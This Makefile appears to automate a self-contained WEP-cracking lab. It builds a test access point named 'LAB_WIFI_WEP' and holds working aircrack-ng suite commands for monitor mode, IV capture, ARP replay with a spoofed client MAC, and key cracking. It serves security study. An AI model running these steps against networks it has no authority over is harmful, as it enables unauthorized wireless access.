AP_INTERFACE=wlx00c0caabaa8c
AP_BSSID=00:C0:CA:AB:AA:8C
AP_SSID=LAB_WIFI_WEP
AP_PWD=7061737377 # Hexadecimal for `passw`.
AP_CH=6

STA_MAC=C0:EE:FB:F8:6D:F2

ATK_INTERFACE=wlxb8eca3d9d777

create_wep_network:
	sudo airbase-ng -w $(AP_PWD) -c $(AP_CH) --essid $(AP_SSID) $(AP_INTERFACE)

enable_monitor_mode:
	nmcli device set $(ATK_INTERFACE) managed no
	sudo airmon-ng start $(ATK_INTERFACE)

capture_ivs:
	sudo airodump-ng -c $(AP_CH) --bssid $(AP_BSSID) -w output $(ATK_INTERFACE)

replay_arp:
	sudo aireplay-ng -3 -b $(AP_BSSID) -h $(STA_MAC) $(ATK_INTERFACE)

crack_wep:
	sudo aircrack-ng -b $(AP_BSSID) output*.cap

clean:
	rm -rf output*.cap output*.csv output*.netxml replay*.cap *.xor
